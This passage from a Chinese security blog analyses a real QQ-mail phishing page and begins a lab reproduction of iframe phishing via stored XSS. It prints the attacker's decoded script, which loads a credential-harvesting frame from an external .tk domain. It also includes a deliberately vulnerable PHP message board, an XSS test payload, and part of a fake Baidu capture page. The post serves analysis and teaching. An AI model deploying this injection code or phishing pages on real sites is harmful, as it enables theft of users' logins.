class="string">"100%"</span> <span class="attr">width</span>=<span class="string">"100%"</span>  <span class="attr">frameborder</span>=<span class="string">"0"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>   <span class="attr">language</span>=<span class="string">"javascript"</span>&gt;</span><span class="undefined">   </span></span><br><span class="line"><span class="undefined">               var pos,str,para,url;  </span></span><br><span class="line"><span class="undefined">                str = window.location.href;  </span></span><br><span class="line"><span class="undefined">                pos = str.indexOf("?")  ;</span></span><br><span class="line"><span class="undefined">                url = str.substring(pos 1);  </span></span><br><span class="line"><span class="undefined">                if (pos&gt;0)&#123;  </span></span><br><span class="line"><span class="undefined">				n='http://ujhgdgjalkfja2.tk/';</span></span><br><span class="line"><span class="undefined">				j1=n url;</span></span><br><span class="line"><span class="xml">				c='<span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"shortcut icon"</span> <span class="attr">href</span>=<span class="string">"https://s.tbcdn.cn/apps/login/static/img/favicon.ico"</span> <span class="attr">type</span>=<span class="string">"image/x-icon"</span> /&gt;</span>';</span></span><br><span class="line"><span class="xml">				b='<span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined">html&#123;overflow:hidden;&#125;body&#123;height:100%;margin:0px;&#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">body</span> <span class="attr">scroll</span>=<span class="string">"no"</span>&gt;</span>';</span></span><br><span class="line"><span class="xml">				a='<span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">"main"</span>  <span class="attr">height</span>=<span class="string">"100%"</span> <span class="attr">src</span>=<span class="string">"';</span></span></span></span><br><span class="line"><span class="xml">				k1='" width="101%"  frameborder="0"&gt;<span class="tag">&lt;/<span class="name">iframe</span>&gt;</span>';</span></span><br><span class="line"><span class="undefined"> 				var  d =  window.frames[0];</span></span><br><span class="line"><span class="undefined">  				d.document.write(c b a j1 k1);   </span></span><br><span class="line"><span class="undefined">                &#125;  </span></span><br><span class="line"><span class="undefined">                else  </span></span><br><span class="line"><span class="undefined">                &#123;  </span></span><br><span class="line"><span class="undefined">                &#125;  </span></span><br><span class="line"><span class="undefined">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span>"));</span><br><span class="line">//--&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span>"));</span><br><span class="line">//--&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>我们解码出完整代码就可以看到，他使用javascript的document.write方法，动态写入html页面覆盖整个文档，因为这么大量的js动态写入会非常慢，所以他在页面没有加载完之前，使用了“加载中”来掩盖这个网站原有的内容。</p>
<p>他前面大部分代码应该是从别人钓鱼qq空间用的代码中提取出来的，所以那部分css和js有很多不合理的地方，而且整个页面背景与登陆框都是调用他自己服务器保存好的截图，不是用html和css写出来的，导致不能完整的模仿出qq邮箱的一些样式，欺骗性大大降低。</p>
<p>最后的部分也就是他真正用来盗取账号密码的部分，攻击者远程调用了一个iframe框架,使用js依次将写好的变量c b a j1 k1的内容动态写入当前页面</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span>=<span class="string">"iframe"</span>   <span class="attr">height</span>=<span class="string">"100%"</span> <span class="attr">width</span>=<span class="string">"100%"</span>  <span class="attr">frameborder</span>=<span class="string">"0"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>   <span class="attr">language</span>=<span class="string">"javascript"</span>&gt;</span><span class="undefined">   </span></span><br><span class="line"><span class="undefined">               var pos,str,para,url;  </span></span><br><span class="line"><span class="undefined">                str = window.location.href;  </span></span><br><span class="line"><span class="undefined">                pos = str.indexOf("?")  ;</span></span><br><span class="line"><span class="undefined">                url = str.substring(pos 1);  </span></span><br><span class="line"><span class="undefined">                if (pos&gt;0)&#123;  </span></span><br><span class="line"><span class="undefined">				n='http://ujhgdgjalkfja2.tk/';</span></span><br><span class="line"><span class="undefined">				j1=n url;</span></span><br><span class="line"><span class="xml">				c='<span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"shortcut icon"</span> <span class="attr">href</span>=<span class="string">"https://s.tbcdn.cn/apps/login/static/img/favicon.ico"</span> <span class="attr">type</span>=<span class="string">"image/x-icon"</span> /&gt;</span>';</span></span><br><span class="line"><span class="xml">				b='<span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined">html&#123;overflow:hidden;&#125;body&#123;height:100%;margin:0px;&#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">body</span> <span class="attr">scroll</span>=<span class="string">"no"</span>&gt;</span>';</span></span><br><span class="line"><span class="xml">				a='<span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">"main"</span>  <span class="attr">height</span>=<span class="string">"100%"</span> <span class="attr">src</span>=<span class="string">"';</span></span></span></span><br><span class="line"><span class="xml">				k1='" width="101%"  frameborder="0"&gt;<span class="tag">&lt;/<span class="name">iframe</span>&gt;</span>';</span></span><br><span class="line"><span class="undefined"> 				var  d =  window.frames[0];</span></span><br><span class="line"><span class="undefined">  				d.document.write(c b a j1 k1);   </span></span><br><span class="line"><span class="undefined">                &#125;  </span></span><br><span class="line"><span class="undefined">                else  </span></span><br><span class="line"><span class="undefined">                &#123;  </span></span><br><span class="line"><span class="undefined">                &#125;  </span></span><br><span class="line"><span class="undefined">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>其中</p>
<ul>
<li>str=window.location.href是获取当前url赋值给str</li>
<li>pos=str.indexOf(“?”)是寻找str字符串也就是当前url中第一次出现?的位置并且返回给pos</li>
<li>url=str.substring(pos 1)是将pos到结束的字符串返回给url，后面的1小于pos的话，就是将从第一位到?的字符串返回给url</li>
</ul>
<p>前面我们已经知道windows.location.href是<a href="http://www.topaone.com/JPadmin/images/login/ucds/dsif/fysh/g7ues/fsr3/kyuwr1.htm?xmk/youx1?id=qyshz107&amp;/OdJb" target="_blank" rel="noopener">http://www.topaone.com/JPadmin/images/login/ucds/dsif/fysh/g7ues/fsr3/kyuwr1.htm?xmk/youx1?id=qyshz107&amp;/OdJb</a></p>
<p>那么这里url就是xmk/youx1?id=qyshz107&amp;/OdJb</p>
<p>然后整个页面的结果就是：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"shortcut icon"</span> <span class="attr">href</span>=<span class="string">"https://s.tbcdn.cn/apps/login/static/img/favicon.ico"</span> <span class="attr">type</span>=<span class="string">"image/x-icon"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">html&#123;overflow:hidden;&#125;body&#123;height:100%;margin:0px;&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">scroll</span>=<span class="string">"no"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">"main"</span>  <span class="attr">height</span>=<span class="string">"100%"</span> <span class="attr">src</span>=<span class="string">"http://ujhgdgjalkfja2.tk/xmk/youx1/?id=qyshz107&amp;/OdJb"</span> <span class="attr">width</span>=<span class="string">"101%"</span>  <span class="attr">frameborder</span>=<span class="string">"0"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>典型的iframe框架钓鱼，这个时候我们如果在登陆框输入东西，实际上是在对方服务器的一个页面 <a href="http://ujhgdgjalkfja2.tk/xmk/youx1/?id=qyshz107&amp;/OdJb" target="_blank" rel="noopener">http://ujhgdgjalkfja2.tk/xmk/youx1/?id=qyshz107&amp;/OdJb</a> 内输入东西，如果不确定的话我们可以直接访问这个链接看一眼，发现的确是一个制作好的邮箱页面。那么已经到了对方服务器上面的，你的输入对方想怎么记录怎么保存都可以。如果之前输入了账号密码，此时已经在服务器上保存了，对方的目的其实已经达到。</p>
<p>但是进一步抓包测试，发现对方在这里接收了账号密码并保存之后，还会传输数据到真正的qq邮箱地址去登陆，然后返回是否成功登陆的信息，如果失败就返回账号密码错误信息。如果成功登陆，就会控制windows.location.href跳转到真正的qq邮箱mail.qq.com，这样减轻用户的嫌疑。</p>
<p><img src="http://oo3iot5oz.bkt.clouddn.com/fashing/fashing05.png" alt=""></p>
<p><img src="http://oo3iot5oz.bkt.clouddn.com/fashing/fashing06.png" alt=""></p>
<p>至此，对方的整个钓鱼过程就完成了，如果他的细节处理好一点，对一些萌新就能瞒天过海了。</p>
<p>这个ujhgdgjalkfja2.tk就是对方的域名了，.tk后缀可能大家不常见，但是实际上这是一个注册量非常庞大的顶级域名。</p>
<p>百科中是这样说的：</p>
<p><img src="http://oo3iot5oz.bkt.clouddn.com/fashing/fashing07.png" alt=""></p>
<p>.TK的域名是南太平洋一个仅有1,268人的岛国托克劳（历史上亦称联合群岛或托克劳群岛）的国家顶级域名。它是任何人都可以申请的免费的顶级域名之一。(ccTLD).TK已拥有活跃域名2500万个，成为了世界第一大ccTLD。</p>
<p>既然是免费的国外域名，那么.tk域名一定是很多不法分子所钟爱的。这个域名通过域名反查和ip地址也基本得不到太多有用的信息。</p>
<p><img src="http://oo3iot5oz.bkt.clouddn.com/fashing/fashing08.png" alt=""></p>
<h2 id="0x03-复现-环境搭建"><a href="#0x03-复现-环境搭建" class="headerlink" title="0x03 复现-环境搭建"></a>0x03 复现-环境搭建</h2><p>之前在 <a href="http://uuzdaisuki.com/2018/04/24/XSS%E7%BB%95%E8%BF%87%E5%92%8C%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">http://uuzdaisuki.com/2018/04/24/XSS%E7%BB%95%E8%BF%87%E5%92%8C%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/</a> 中提到了钓鱼的几种方式，其中iframe框架钓鱼只描述了一下原理并且用了一个小例子，那么就在这里补充下存储型xss怎么调用iframe钓鱼。</p>
<p>既然要复现整个钓鱼过程，我们就要用到一个存在存储型xss漏洞的页面、一个伪造的html页面、一个接收伪造页面传输的数据的php文件、一个保存数据的txt文件。</p>
<h4 id="留言系统搭建"><a href="#留言系统搭建" class="headerlink" title="留言系统搭建"></a>留言系统搭建</h4><p>首先搭建存在存储型xss漏洞的页面，我们在这里搭建一个简易的留言系统进行测试，一共需要用到message.php和save.php两个页面。</p>
<p>其中message.php负责输入留言和展示留言，代码如下：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html; charset=utf-8"</span> /&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>留言系统<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"width:500px;"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">style</span>=<span class="string">"text-align:left;"</span> <span class="attr">action</span>=<span class="string">"save.php"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">昵&amp;nbsp&amp;nbsp称：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"name"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">留&amp;nbsp&amp;nbsp言：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"message"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">&lt;?php</span><br><span class="line">$con=mysqli_connect("localhost","root","123456","test");</span><br><span class="line">if(!$con)&#123;</span><br><span class="line"> die("database connect error!");</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$result=mysqli_query($con,"select `name`, `message` from mess;");</span><br><span class="line"></span><br><span class="line">while($row = $result-&gt;fetch_assoc()) &#123;</span><br><span class="line">        echo "&lt;hr&gt;&lt;br&gt;Name: " . urldecode($row["name"]). "&lt;br&gt;  Message: " . urldecode($row["message"]). "&lt;br&gt;&lt;br&gt;&lt;hr&gt;&lt;br&gt;";</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>save.php负责将接收到的昵称和留言上传到数据库，并跳转回message.php这里数据库内只要新建名为mess的表，存在name和message两个字段即可实现这个功能。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$name = urlencode($_REQUEST['name']);</span><br><span class="line">$message = urlencode($_REQUEST['message']);</span><br><span class="line">echo '&lt;br&gt;';</span><br><span class="line"></span><br><span class="line">$con=mysqli_connect("localhost","root","123456","test");</span><br><span class="line">if(!$con)&#123;</span><br><span class="line"> die("database connect error!");</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if($name&amp;&amp;$message)</span><br><span class="line">&#123;</span><br><span class="line">	</span><br><span class="line">	mysqli_query($con,"INSERT INTO `mess` (`name`, `message`) VALUES ('".$name."', '".$message."');");</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo '&lt;script language="javascript"&gt;';</span><br><span class="line">echo "location.href='./message.php'";</span><br><span class="line">echo '&lt;/script&gt;';</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>然后我们发现输入正常留言可以显示出来：</p>
<p><img src="http://oo3iot5oz.bkt.clouddn.com/fashing/fashing09.png" alt=""></p>
<p>构造一个xss代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
<p>也可以正常运行，证明存在存储型xss：</p>
<p><img src="http://oo3iot5oz.bkt.clouddn.com/fashing/fashing10.png" alt=""></p>
<h4 id="服务器接收页面"><a href="#服务器接收页面" class="headerlink" title="服务器接收页面"></a>服务器接收页面</h4><p>我们的服务器上，要有一个可供调用的伪造html页面，一个接收数据的php文件，一个储存数据的txt文件。</p>
<p>这里我伪造一个百度的主页进行测试，来捕获这个人搜索的信息。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"icon"</span> <span class="attr">href</span>=<span class="string">"image/favicon.ico"</span> <span class="attr">type</span>=<span class="string">"image/x-icon"</span> /&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"shortcut icon"</span> <span class="attr">href</span>=<span class="string">"image/favicon.ico"</span> <span class="attr">type</span>=<span class="string">"image/x-icon"</span> /&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;<span class="name">title</span>&gt;</span>百度一下，你就知道<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined"> 	.dd&#123;</span></span><br><span class="line"><span class="undefined"> 	color: gray;</span></span><br><span class="line"><span class="undefined"> 	font-family: "微软雅黑";</span></span><br><span class="line"><span class="undefined"> 	&#125;</span></span><br><span class="line"><span class="undefined"> 	.dd a&#123;</span></span><br><span class="line"><span class="undefined"> 	color: gray;</span></span><br><span class="line"><span class="undefined"> 	font-family: "微软雅黑";</span></span><br><span class="line"><span class="undefined"> 	&#125;</span></span><br><span class="line"><span class="undefined"> 	.aa a&#123;</span></span><br><span class="line"><span class="undefined"> 	color: #000000;</span></span><br><span class="line"><span class="undefined"> 	font-family: "微软雅黑";</span></span><br><span class="line"><span class="undefined"> 	font-size: 15px;</span></span><br><span class="line"><span class="undefined"> 	&#125;</span></span><br><span class="line"><span class="undefined"> 	body&#123;</span></span><br><span class="line"><span class="undefined"> 	margin: 0;</span></span><br><span class="line"><span class="undefined"> 	padding: 0;</span></span><br><span class="line"><span class="undefined"> 	&#125;</span></span><br><span class="line"><span class="undefined"> 	font:hover&#123;</span></span><br><span class="line"><span class="undefined"> 	cursor: pointer;</span></span><br><span class="line"><span class="undefined"> 	color: red;</span></span><br><span class="line"><span class="undefined"> 	&#125;</span></span><br><span class="line"><span class="undefined"> 	.back-img&#123;</span></span><br><span class="line"><span class="undefined"> 	border: 1px solid #000000;</span></span><br><span class="line"><span class="undefined"> 	position: absolute;</span></span><br><span class="line"><span class="undefined"> 	width: 100%;</span></span><br><span class="line"><span class="undefined"> 	height: 100%;</span></span><br><span class="line"><span class="undefined"> 	top: 0px;</span></span><br><span class="line"><span class="undefined"> 	left: 0px;</span></span><br><span class="line"><span class="undefined"> 	background-color: #000000;</span></span><br><span class="line"><span class="undefined"> 	opacity: 0.3;</span></span><br><span class="line"><span class="undefined"> 	z-index: 100;</span></span><br><span class="line"><span class="undefined"> 	display: none;</span></span><br><span class="line"><span class="undefined"> 	&#125;</span></span><br><span class="line"><span class="undefined"> 	.login&#123;</span></span><br><span class="line"><span class="undefined"> 	border: 1px solid #000000;</span></span><br><span class="line"><span class="undefined"> 	width: 390px;</span></span><br><span class="line"><span class="undefined"> 	height: 500px;</span></span><br><span class="line"><span class="undefined"> 	position: absolute;</span></span><br><span class="line"><span class="undefined"> 	top:26%;</span></span><br><span class="line"><span class="undefined"> 	left: 35%;</span></span><br><span class="line"><span class="undefined"> 	background-color:white;</span></span><br><span class="line"><span class="undefined"> 	z-index: 110;</span></span><br><span class="line"><span class="undefined"> 	display: none;</span></span><br><span class="line"><span class="undefined"> 	&#125;</span></span><br><span class="line"><span class="undefined"> 	.login-top&#123;</span></span><br><span class="line"><span class="undefined"> 	position: absolute;</span></span><br><span class="line"><span class="undefined"> 	width: 100%;</span></span><br><span class="line"><span class="undefined"> 	height: 10%;</span></span><br><span class="line"><span class="undefined"> 	background-color:white;</span></span><br><span class="line"><span class="undefined"> 	&#125;</span></span><br><span class="line"><span class="undefined"> 	.close-login&#123;</span></span><br><span class="line"><span class="undefined"> 	display: block;</span></span><br><span class="line"><span class="undefined"> 	position: absolute;</span></span><br><span class="line"><span class="undefined"> 	right: 10px;</span></span><br><span class="line"><span class="undefined"> 	top: 5px;</span></span><br><span class="line"><span class="undefined"> 	width: 30px;</span></span><br><span class="line"><span class="undefined"> 	height: 30px;</span></span><br><span class="line"><span class="undefined"> 	text-align: center;</span></span><br><span class="line"><span class="undefined"> 	line-height: 30px;</span></span><br><span class="line"><span class="undefined"> 	font-size: 30px;</span></span><br><span class="line"><span class="undefined"> 	color: gray;</span></span><br><span class="line"><span class="undefined"> 	&#125;</span></span><br><span class="line"><span class="undefined"> 	.close-login:hover&#123;</span></span><br><span class="line"><span class="undefined"> 	border: 1px solid gray;</span></span><br><span class="line"><span class="undefined"> 	cursor: pointer;</span></span><br><span class="line"><span class="undefined"> 	&#125;</span></span><br><span class="line"><span class="undefined"> 	.login-top:hover&#123;</span></span><br><span class="line"><span class="undefined"> 	cursor: move;</span></span><br><span class="line"><span class="undefined"> 	&#125;</span></span><br><span class="line"><span class="undefined"> 	 </span></span><br><span class="line"><span class="undefined"> 	</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;<span class="name">table</span> <span class="attr">border</span>=<span class="string">"0px"</span> <span class="attr">width</span>=<span class="string">"100%"</span> <span class="attr">height</span>=<span class="string">"800px"</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;<span class="name">tr</span> <span class="attr">height</span>=<span class="string">"10%"</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">"right"</span> <span class="attr">class</span>=<span class="string">"aa"</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;<span class="name">strong</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>新闻<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">strong</span>&gt;</span>&amp;nbsp;&amp;nbsp;</span><br><span class="line"> 	<span class="tag">&lt;<span class="name">strong</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>hao123<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">strong</span>&gt;</span>&amp;nbsp;&amp;nbsp;</span><br><span class="line"> 	<span class="tag">&lt;<span class="name">strong</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>地图<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">strong</span>&gt;</span>&amp;nbsp;&amp;nbsp;</span><br><span class="line"> 	<span class="tag">&lt;<span class="name">strong</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>视频<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">strong</span>&gt;</span>&amp;nbsp;&amp;nbsp;</span><br><span class="line"> 	<span class="tag">&lt;<span class="name">strong</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>贴吧<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">strong</span>&gt;</span>&amp;nbsp;&amp;nbsp;</span><br><span class="line"> 	<span class="tag">&lt;<span class="name">strong</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>学术<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">strong</span>&gt;</span>&amp;nbsp;&amp;nbsp;</span><br><span class="line"> 	<span class="tag">&lt;<span class="name">font</span> <span class="attr">class</span>=<span class="string">"tt"</span> <span class="attr">onclick</span>=<span class="string">"login()"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>登录<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span 